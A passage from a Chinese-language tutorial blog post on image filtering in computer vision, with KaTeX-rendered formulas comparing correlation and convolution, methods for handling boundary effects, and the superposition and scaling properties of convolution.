<p>&nbsp;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>I</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mo>−</mo><mi>k</mi></mrow><mi>k</mi></msubsup><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mo>−</mo><mi>k</mi></mrow><mi>k</mi></msubsup><mi>F</mi><mo stretchy="false">(</mo><mo>−</mo><mi>i</mi><mo separator="true">,</mo><mo>−</mo><mi>j</mi><mo stretchy="false">)</mo><mo>⋅</mo><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo>+</mo><mi>i</mi><mo separator="true">,</mo><mi>Y</mi><mo>+</mo><mi>j</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I&#x27;(X, Y) = \sum_{i=-k}^{k} \sum_{j=-k}^{k} F(-i, -j) \cdot I(X + i, Y + j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.4248em;vertical-align:-0.4358em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.989em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">−</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.358em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.989em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">−</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4358em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord">−</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span></span></span></span></p>
<p>或者可以表示为：</p>
<p>&nbsp;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>I</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mo>−</mo><mi>k</mi></mrow><mi>k</mi></msubsup><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mo>−</mo><mi>k</mi></mrow><mi>k</mi></msubsup><mi>F</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo><mo>⋅</mo><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo>−</mo><mi>i</mi><mo separator="true">,</mo><mi>Y</mi><mo>−</mo><mi>j</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I&#x27;(X, Y) = \sum_{i=-k}^{k} \sum_{j=-k}^{k} F(i, j) \cdot I(X - i, Y - j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.4248em;vertical-align:-0.4358em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.989em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">−</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.358em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.989em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">−</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4358em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span></span></span></span></p>
<h3 id="比较Correlation和Convolution"><a href="#比较Correlation和Convolution" class="headerlink" title="比较Correlation和Convolution"></a>比较Correlation和Convolution</h3><p><img data-src="/images/coding/computer-vision-basic-filter/Screenshot_20241019_221848.png"></p>
<p>如果是Correlation，那么 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>I</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><mi>a</mi><mo>+</mo><mn>2</mn><mi>b</mi><mo>+</mo><mn>3</mn><mi>c</mi><mo>+</mo><mn>4</mn><mi>d</mi><mo>+</mo><mn>5</mn><mi>e</mi><mo>+</mo><mn>6</mn><mi>f</mi><mo>+</mo><mn>7</mn><mi>g</mi><mo>+</mo><mn>8</mn><mi>h</mi><mo>+</mo><mn>9</mn><mi>i</mi></mrow><annotation encoding="application/x-tex">I&#x27;(1, 1) = 1a + 2b + 3c + 4d + 5e + 6f + 7g + 8h + 9i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">1</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">3</span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord">4</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">5</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord">6</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">7</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord">8</span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord">9</span><span class="mord mathnormal">i</span></span></span></span></p>
<p>如果是Convolution，那么 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>I</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mn>9</mn><mi>a</mi><mo>+</mo><mn>8</mn><mi>b</mi><mo>+</mo><mn>7</mn><mi>c</mi><mo>+</mo><mn>6</mn><mi>d</mi><mo>+</mo><mn>5</mn><mi>e</mi><mo>+</mo><mn>4</mn><mi>f</mi><mo>+</mo><mn>3</mn><mi>g</mi><mo>+</mo><mn>2</mn><mi>h</mi><mo>+</mo><mn>1</mn><mi>i</mi></mrow><annotation encoding="application/x-tex">I&#x27;(1, 1) = 9a + 8b + 7c + 6d + 5e + 4f + 3g + 2h + 1i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">9</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord">8</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">7</span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord">6</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">5</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord">4</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">3</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord">1</span><span class="mord mathnormal">i</span></span></span></span></p>
<h2 id="Boundary-Effects-边际效应"><a href="#Boundary-Effects-边际效应" class="headerlink" title="Boundary Effects (边际效应)"></a>Boundary Effects (边际效应)</h2><p>其实我们可以发现，当滤波器放置在图像边缘附近会导致滤波器部分超出图像范围</p>
<p><img data-src="/images/coding/computer-vision-basic-filter/Screenshot_20241019_222542.png"></p>
<p>为处理这种情况，常用的方法包括：</p>
<ul>
<li><strong>忽略边界 (Ignore&#x2F;discard)</strong>：不对边界区域进行运算，但是这种方式会导致输出图像比输入图像小。</li>
<li><strong>零填充 (Zero Paddings)</strong>：在图像边缘填充零值，使输出图像与输入图像大小相同，但可能引入边界伪影。<br><img data-src="/images/coding/computer-vision-basic-filter/Screenshot_20241019_222824.png"></li>
<li><strong>假设周期性 (Assume periodicity)</strong>：将图像视为周期性延展，滤波器超出部分从另一边“绕回”图像。<br><img data-src="/images/coding/computer-vision-basic-filter/Screenshot_20241019_222841.png"></li>
<li><strong>边界反射</strong>：通过反射图像边缘的像素值来填充，使边界区域更加平滑。<br><img data-src="/images/coding/computer-vision-basic-filter/Screenshot_20241019_222851.png"></li>
</ul>
<h2 id="卷积的数学特性"><a href="#卷积的数学特性" class="headerlink" title="卷积的数学特性"></a>卷积的数学特性</h2><p>前面说到，卷积有很多很好的数学特性。</p>
<p>其中<strong>结合律</strong>和<strong>对称性</strong>为卷积独有，前四个特性Correlation也有。</p>
<h3 id="Superposition-叠加性"><a href="#Superposition-叠加性" class="headerlink" title="Superposition (叠加性)"></a>Superposition (叠加性)</h3><p>假设 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>F</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">F_1 </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>F</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">F_2 </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 是两个相同尺寸的滤波器，则：</p>
<p>&nbsp;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>F</mi><mn>1</mn></msub><mo>+</mo><msub><mi>F</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>⊗</mo><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>F</mi><mn>1</mn></msub><mo>⊗</mo><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>+</mo><msub><mi>F</mi><mn>2</mn></msub><mo>⊗</mo><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(F_1 + F_2) \otimes I(X, Y) = F_1 \otimes I(X, Y) + F_2 \otimes I(X, Y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span></span></span></span></p>
<h3 id="Scaling-缩放性"><a href="#Scaling-缩放性" class="headerlink" title="Scaling (缩放性)"></a>Scaling (缩放性)</h3><p>假设 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi></mrow><annotation encoding="application/x-tex">F </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span></span></span></span>  是一个滤波器，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>  是一个scalar，则：</p>
<p>&nbsp;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>k</mi><mi>F</mi><mo stretchy="false">)</mo><mo>⊗</mo><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>k</mi><mo stretchy="false">(</mo><mi>F</mi><mo>⊗</mo><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(kF) \otimes I(X, Y) = k(F \otimes I(X, Y))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span 